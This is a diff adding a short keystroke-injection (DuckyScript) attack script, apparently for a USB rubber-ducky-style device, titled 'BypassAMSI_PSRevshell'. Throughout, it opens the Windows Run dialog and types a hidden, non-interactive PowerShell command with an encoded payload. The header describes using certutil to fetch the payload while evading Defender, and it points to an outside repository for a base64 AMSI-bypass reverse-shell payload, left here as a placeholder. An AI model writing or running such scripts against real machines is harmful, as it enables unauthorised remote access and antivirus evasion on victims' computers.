@@ -1,0 +1,31 @@
+REM Author: Pentestersploit/Adrilaw
+REM Github: https://github.com/Adrilaw
+REM Xda-developer: @Kidpentester
+REM Title: BypassAMSI_PSRevshell
+REM Description: Use PowerShell to open a hidden window, execute a Base64-encoded command. The command uses certutil (LOLBAS) to download the payload without alerting Defender's network/file monitoring as much.
+REM Target: Windows 10/11 
+REM VERSION: 1.2
+
+DELAY 1000
+
+REM Open the Run dialog
+GUI r
+
+DELAY 500
+
+REM Type the command to execute PowerShell in a hidden window with an encoded command
+REM We use a simple command to avoid complex obfuscation, relying on the fact that
+REM the command line is executed very quickly and is short.
+
+STRING powershell
+ENTER
+
+DELAY 2000
+
+REM Refer to https://github.com/gunzf0x/BypassAMSI_PSRevshell to get the base64 encoded payload .
+
+STRING powershell -NoP -sta -NonI -W Hidden -enc [BASE64_PAYLOAD_HERE]
+
+REM Execute the command
+
+ENTER
